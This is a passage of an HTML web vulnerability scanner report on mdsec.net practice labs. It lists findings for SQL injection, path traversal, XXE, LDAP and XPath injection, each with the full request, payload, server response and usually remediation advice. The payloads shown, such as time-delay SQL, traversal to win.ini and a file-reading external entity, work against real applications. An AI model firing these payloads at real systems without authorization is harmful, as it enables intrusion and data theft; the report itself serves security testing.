+<div class="rr_div"><span>POST /addressbook/32/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/addressbook/32/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 116<br><br>__VIEWSTATE=%2FwEPDw<wbr>UKMTI0NzE5MjI0MGRkoX<wbr>v4BXfugQRsGddxJO96PBvk5rI<wbr>%3D&amp;Name=&amp;Email=<span class="HIGHLIGHT">''</span>&amp;Phone=&amp;Search=Search<wbr>&amp;Address=&amp;Age=</span></div>
+<h2>Response 2</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:40:58 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2721<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Contacts&lt;/title&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="2.3">2.3.&nbsp;https://mdsec.net/auth/319/Default.ashx [password parameter]</span>
+<br><a class="PREVNEXT" href="#2.2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#2.4">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/319/Default.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'waitfor%20delay'0%3a0<wbr>%3a20'--</b> was submitted in the password parameter. The application took <b>20550</b> milliseconds to respond to the request, compared with <b>278</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be Microsoft SQL Server.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /auth/319/Default.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://mdsec.net/auth<wbr>/319/Default.ashx<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 27<br><br>username=user&amp;password<wbr>=user<span class="HIGHLIGHT">'waitfor%20delay'0%3a0<wbr>%3a20'--</span></span></div>
+<h2>Response (redirected)</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:44:19 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1552<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Login&lt;/title&gt;<br>&lt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="2.4">2.4.&nbsp;https://mdsec.net/auth/319/Default.ashx [username parameter]</span>
+<br><a class="PREVNEXT" href="#2.3">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9.1">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>https://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/auth/319/Default.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'waitfor%20delay'0%3a0<wbr>%3a20'--</b> was submitted in the username parameter. The application took <b>40664</b> milliseconds to respond to the request, compared with <b>278</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be Microsoft SQL Server.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /auth/319/Default.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://mdsec.net/auth<wbr>/319/Default.ashx<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 27<br><br>username=user<span class="HIGHLIGHT">'waitfor%20delay'0%3a0<wbr>%3a20'--</span>&amp;password=user</span></div>
+<h2>Response (redirected)</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:41:37 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Expires: -1<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1552<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Login&lt;/title&gt;<br>&lt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="3">3.&nbsp;File path traversal</span>
+<br><a class="PREVNEXT" href="#2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#4">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/filestore/8/GetFile.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>filename</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>..\..\..\..\..\..\..\..\.<wbr>.\..\..\..\..\..\..\..<wbr>\windows\win.ini</b> was submitted in the filename parameter. The requested file was returned in the application's response.</span>
+<h2>Issue background</h2>
+<span class="TEXT">File path traversal vulnerabilities arise when user-controllable data is used within a filesystem operation in an unsafe manner. Typically, a user-supplied filename is appended to a directory prefix in order to read or write the contents of a file. If vulnerable, an attacker can supply path traversal sequences (using dot-dot-slash characters) to break out of the intended directory and read or write files elsewhere on the filesystem.<br><br>This is usually a very serious vulnerability, enabling an attacker to access sensitive files containing configuration data, passwords, database records, log data, source code, and program scripts and binaries.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">Ideally, application functionality should be designed in such a way that user-controllable data does not need to be passed to filesystem operations. This can normally be achieved either by referencing known files via an index number rather than their name, and by using application-generated filenames to save user-supplied file content.<br><br>If it is considered unavoidable to pass user-controllable data to a filesystem operation, three layers of defense can be employed to prevent path traversal attacks:<ul><li>User-controllable data should be strictly validated before being passed to any filesystem operation. In particular, input containing dot-dot sequences should be blocked.</li><li>After validating user input, the application can use a suitable filesystem API to verify that the file to be accessed is actually located within the base directory used by the application. In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, then the user has somehow bypassed the application's input filters, and the request should be rejected. In ASP.NET, the same check can be performed by passing the user-supplied filename to the System.Io.Path.GetFullPath method and checking the returned string in the same way as described for Java.</li><li>The directory used to store files that are accessed using user-controllable data can be located on a separate logical volume to other sensitive application and operating system files, so that these cannot be reached via path traversal attacks. In Unix-based systems, this can be achieved using a chrooted filesystem; on Windows, this can be achieved by mounting the base directory as a new logical drive and using the associated drive letter to access its contents.</li></ul></span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /filestore/8/GetFile.ashx<wbr>?filename=<span class="HIGHLIGHT">..\..\..\..\..\..\..\..\.<wbr>.\..\..\..\..\..\..\..<wbr>\windows\win.ini</span> HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/filestore/8/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:04 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Length: 477<br><br><span class="HIGHLIGHT">; for 16-bit app support</span><br><span class="HIGHLIGHT">[fonts]</span><br><span class="HIGHLIGHT">[extensions]</span><br><span class="HIGHLIGHT">[mci extensions]</span><br><span class="HIGHLIGHT">[files]</span><br>[Mail]<br>MAPI=1<br>[MCI Extensions.BAK]<br>aif=MPEGVideo<br>aifc=MPEGVideo<br>aiff=MPEGVideo<br>asf=MPEGVideo<br>asx=MPEGVideo<br>au=MPEGVideo<br>m1v=MPEGVideo<br>m3u=MPEGVideo<br>mp2=MPEGVideo<br>mp2v=MPEGVideo<br>mp3=MPEGV<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="4">4.&nbsp;XML external entity injection</span>
+<br><a class="PREVNEXT" href="#3">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#5">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/128/AjaxSearch<wbr>.ashx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The application is vulnerable to XML external entity injection. The tag <b>&lt;!DOCTYPE foo [&lt;!ENTITY xxedb69a SYSTEM "file:///c:/windows/win<wbr>.ini"&gt; ]&gt;</b> was injected into the XML sent to the server. This tag defines an external entity, <b>xxedb69a</b>, which references a file on the XML parser's filesystem. This entity was then used within a data field in the XML document. The server's response contains the contents of the specified file, indicating that the parser processed the injected external entity.</span>
+<h2>Issue background</h2>
+<span class="TEXT">XML external entity injection vulnerabilities arise because the XML specification allows XML documents to define entities which reference resources external to the document. XML parsers typically support this feature by default, even though it is rarely required by applications during normal usage.<br><br>External entities can reference files on the parser's filesystem; exploiting this feature may allow retrieval of arbitrary files, or denial of service by causing the server to read from a file such as /dev/random. They can also reference URLs; exploiting this feature may allow port scanning from the XML parser's host, or the retrieval of sensitive web content which is otherwise inaccessible due to network topology and defenses.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">XML external entity injection makes use of the DOCTYPE tag to define the injected entity. XML parsers can usually be configured to disable support for this tag. You should consult the documentation for your XML parsing library to determine how to disable this feature.<br><br>It may also be possible to use input validation to block input containing a DOCTYPE tag.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /search/128/AjaxSearch<wbr>.ashx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: text/xml; charset=UTF-8<br>Referer: http://mdsec.net/search<wbr>/128/<br>Content-Length: 43<br>Connection: keep-alive<br>Pragma: no-cache<br>Cache-Control: no-cache<br><br><span class="HIGHLIGHT">&lt;!DOCTYPE foo [&lt;!ENTITY xxedb69a SYSTEM "file:///c:/windows/win<wbr>.ini"&gt; ]&gt;</span>&lt;Search&gt;&lt;SearchTerm&gt;a<span class="HIGHLIGHT">&amp;xxedb69a;</span>&lt;/SearchTerm&gt;&lt;/Search&gt;</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:44:58 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/xml; charset=utf-8<br>Content-Length: 557<br><br>&lt;Search&gt;&lt;SearchResult&gt;No results found for expression: a<span class="HIGHLIGHT">; for 16-bit app support</span><br><span class="HIGHLIGHT">[fonts]</span><br><span class="HIGHLIGHT">[extensions]</span><br><span class="HIGHLIGHT">[mci extensions]</span><br><span class="HIGHLIGHT">[files]</span><br>[Mail]<br>MAPI=1<br>[MCI Extensions.BAK]<br>aif=MPEGVideo<br>aifc=MPEGVideo<br>aiff=MPEGVideo<br>asf=MPEGVideo<br>asx=MPEGVideo<br>au=MPEGVideo<br>m1v=MPEGVideo<br>m3u=MPEGVideo<br>mp2=MPEGVideo<br>mp2v=MPEGVideo<br>mp3=MPEGV<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="5">5.&nbsp;LDAP injection</span>
+<br><a class="PREVNEXT" href="#4">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#6">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_tentative_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Tentative</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/employees/42/Default<wbr>.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>Name</b> parameter appears to be vulnerable to LDAP injection attacks.<br><br>The payloads <b>*)(sn=*</b> and <b>*)!(sn=*</b> were each submitted in the Name parameter. These two requests resulted in different responses, indicating that the input may be being incorporated into a conjunctive LDAP query in an unsafe manner.</span>
+<h2>Issue background</h2>
+<span class="TEXT">LDAP injection arises when user-controllable data is copied in an unsafe way into an LDAP query that is performed by the application. If an attacker can inject LDAP metacharacters into the query, then they can interfere with the query's logic. Depending on the function for which the query is used, the attacker may be able to retrieve sensitive data to which they are not authorized, or subvert the application's logic to perform some unauthorized action.<br><br>Note that automated difference-based tests for LDAP injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">If possible, applications should avoid copying user-controllable data into LDAP queries. If this is unavoidable, then the data should be strictly validated to prevent LDAP injection attacks. In most situations, it will be appropriate to allow only short alphanumeric strings to be copied into queries, and any other input should be rejected. At a minimum, input containing any LDAP metacharacters should be rejected; characters that should be blocked include ( ) ; , * | & = and whitespace.</span>
+<h2>Request 1</h2>
+<div class="rr_div"><span>POST /employees/42/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/employees/42/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 30<br><br>Name=<span class="HIGHLIGHT">*)(sn=*</span>&amp;Search=Submit+Query</span></div>
+<h2>Response 1</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:49:26 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2821<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Employee search&lt;<br><b>...[SNIP]...</b><br>&lt;<span class="HIGHLIGHT">table border="1"&gt;&lt;tr&gt;&lt;b&gt;&lt;td&gt;&lt;b<wbr>&gt;First name&amp;nbsp;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b<wbr>&gt;Last name&amp;nbsp;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b<wbr>&gt;Department&amp;nbsp;&lt;/b&gt;&lt;/td<wbr>&gt;&lt;td&gt;&lt;b&gt;Email&amp;nbsp;&lt;/b&gt;&lt;<wbr>/td&gt;&lt;td&gt;&lt;b&gt;Telephone&amp;nbsp<wbr>;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td<wbr>&gt;Peter&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;Weiner&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;London consultancy&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;weiner@wahh-consulting<wbr>.com&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;12461736&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;<wbr>&lt;tr&gt;&lt;td&gt;Greg&amp;nbsp;&lt;/td&gt;<wbr>&lt;td&gt;Adeth&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;London consultancy&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;smeg@wahh-consulting.com<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;91319721<wbr>&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td<wbr>&gt;Pablina&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;Sisca&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;London consultancy&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;pablo@wahh-consulting<wbr>.com&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;88527361&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;<wbr>&lt;tr&gt;&lt;td&gt;Dave&amp;nbsp;&lt;/td&gt;<wbr>&lt;td&gt;Litchfield&amp;nbsp;&lt;/td&gt;<wbr>&lt;td&gt;London sales&amp;nbsp;&lt;/td&gt;&lt;td&gt;dave<wbr>@wahh-consulting.com&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;91837412&amp;nbsp;&lt;<wbr>/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Colin<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;Gillingham<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;London sales&amp;nbsp;&lt;/td&gt;&lt;td&gt;colin<wbr>@wahh-consulting.com&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;10923457&amp;nbsp;&lt;<wbr>/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Alan<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;Pantrod<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;London sales&amp;nbsp;&lt;/td&gt;&lt;td&gt;alan<wbr>@wahh-consulting.com&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;88312212&amp;nbsp;&lt;<wbr>/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Andrew<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;Birdseye<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;London software&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;birdseye@wahh-consulting<wbr>.com&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;19837478&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;<wbr>&lt;tr&gt;&lt;td&gt;Bill&amp;nbsp;&lt;/td&gt;<wbr>&lt;td&gt;Grinder&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;London software&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;bill@wahh-consulting.com<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;23984723<wbr>&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td<wbr>&gt;Stew&amp;nbsp;&lt;/td&gt;&lt;td&gt;Milne<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;London admin&amp;nbsp;&lt;/td&gt;&lt;td&gt;stew<wbr>@wahh-consulting.com&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;89731312&amp;nbsp;&lt;<wbr>/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Ruth<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;House&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;London admin&amp;nbsp;&lt;/td&gt;&lt;td&gt;ruth<wbr>@wahh-consulting.com&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;19827348&amp;nbsp;&lt;<wbr>/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Kev&amp;nbsp<wbr>;&lt;/td&gt;&lt;td&gt;Dunn-Munters<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;London consultancy&amp;nbsp;&lt;/td&gt;&lt;td<wbr>&gt;kev@wahh-consulting.com<wbr>&amp;nbsp;&lt;/td&gt;&lt;td&gt;12452432<wbr>&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;<wbr>/div&gt;<br><br><br><br>&lt;/body&gt;&lt;/html&gt;</span></span></div>
+<h2>Request 2</h2>
+<div class="rr_div"><span>POST /employees/42/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/employees/42/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 30<br><br>Name=<span class="HIGHLIGHT">*)!(sn=*</span>&amp;Search=Submit+Query</span></div>
+<h2>Response 2</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:49:26 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1054<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Employee search&lt;<br><b>...[SNIP]...</b><br>&lt;<span class="HIGHLIGHT">/div&gt;<br><br><br><br>&lt;/body&gt;&lt;/html&gt;</span></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="6">6.&nbsp;XPath injection</span>
+<br><a class="PREVNEXT" href="#5">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#7">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/cclookup/9/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>Name</b> parameter appears to be vulnerable to XPath injection attacks. The payload <b>'</b> was submitted in the Name parameter, and an XPath error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The application appears to be using the ASP.NET XPath APIs.</span>
+<h2>Issue background</h2>
+<span class="TEXT">XPath injection vulnerabilities arise when user-controllable data is incorporated into XPath queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.<br><br>Depending on the purpose for which the vulnerable query is being used, an attacker may be able to exploit an XPath injection flaw to read sensitive application data or interfere with application logic.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">User input should be strictly validated before being incorporated into XPath queries. In most cases, it will be appropriate to accept input containing only short alhanumeric strings. At the very least, input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /cclookup/9/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/cclookup<wbr>/9/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 114<br><br>__VIEWSTATE=%2FwEPDw<wbr>UJODk5NzA1OTE5ZGQ6yO<wbr>Ii1p1cZ9vZ%2Bqy2mr<wbr>%2BIKz9Y2Q%3D%3D&amp;Name<wbr>=Pete<span class="HIGHLIGHT">'</span>&amp;Password=nandos&amp;Submit<wbr>=Submit</span></div>
+<h2>Response</h2>
